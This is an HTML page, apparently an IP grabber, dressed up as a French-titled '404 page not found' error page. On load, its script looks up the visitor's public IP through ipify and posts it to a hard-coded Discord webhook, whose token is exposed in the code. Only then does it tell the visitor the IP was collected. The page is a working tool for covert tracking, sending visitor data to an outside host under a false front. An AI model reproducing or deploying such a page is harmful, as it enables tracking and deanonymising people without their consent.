<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Collecte d'IP</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
        }

        .container {
            text-align: center;
            max-width: 400px;
            padding: 20px;
            background: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        #message {
            margin-top: 20px;
            font-weight: bold;
            color: green;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Page d'erreur 404</h1>
        <p>Oops! Page not found.</p>
        <div id="message"></div>
    </div>
    <script>
        (async () => {
            // Récupérer l'IP de l'utilisateur avec une API tierce
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const userIP = data.ip;

            // Envoyer l'IP au webhook Discord
            const webhookURL = "https://canary.discord.com/api/webhooks/1301998269723054235/6g2JSve1Q_jmcfzKH3xoNfR-4sSBf-4yp36ehw4G68ujPSbEIX3UpmuAKsBec5S8HjRQ";
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `Nouvelle IP collectée : ${userIP}`
                })
            });

            document.getElementById('message').textContent = "Merci ! Votre adresse IP a été collectée.";
        })();
    </script>
</body>
</html>
